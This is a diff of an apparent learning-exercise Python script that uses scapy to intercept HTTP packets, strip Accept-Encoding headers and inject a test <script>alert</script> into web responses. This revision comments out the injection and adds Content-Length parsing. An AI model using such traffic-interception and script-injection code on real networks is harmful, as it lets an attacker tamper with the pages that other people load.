@@ -7,6 +7,7 @@ import re
 
 AcceptEncodingRegex = "Accept-Encoding:.*?\\r\\n"
 replace_load = ""
+ContentLengthRegex = "Content-Length:\s\d*"
 
 # Take our modified load and set it to the packet load
 def set_load(packet, load):
@@ -36,21 +37,23 @@ def process_packet(packet):
                     load,
                     flags=re.IGNORECASE | re.MULTILINE
                 )
+
             elif scapy_packet[TCP].sport == 80:
                 print("[+] HTTP Response:  ")
-                # invoke python method replace to replace a string with another string
-                load = load.replace("</body>", "<script>alert('Test!'); </script></body>")
-                # This works with http://www.pentest-standard.org/ and allows page to load
-                # modified_load = scapy_packet[Raw].load.replace("</head>", "<script>alert('Test!'); </script></head>")
-                new_packet = set_load(scapy_packet, load)
-                packet.set_payload(str(new_packet))
+                # print(scapy_packet.show())
+                # invoke python method re replace to replace a string with another string
+                # load = load.replace("</body>", "<script>alert('Test!'); </script></body>")
+                content_length_search = re.search("Content-Length:\s\d*", load)
+                if content_length_search:
+                    content_length = content_length_search.group(0)
+                    print("[+] Content Length:  " + str(content_length))
 
             # if load updated, set the load to new_packet, set new_packet as packet
-            if load != scapy_packet[Raw].load:
-                # Create a new packet
-                new_packet = set_load(scapy_packet, load)
-                # set the new packet with the updated payload as the packet
-                packet.set_payload(str(new_packet))
+            # if load != scapy_packet[Raw].load:
+            #     # Create a new packet
+            #     new_packet = set_load(scapy_packet, load)
+            #     # set the new packet with the updated payload as the packet
+            #     packet.set_payload(str(new_packet))
 
     packet.accept()
 
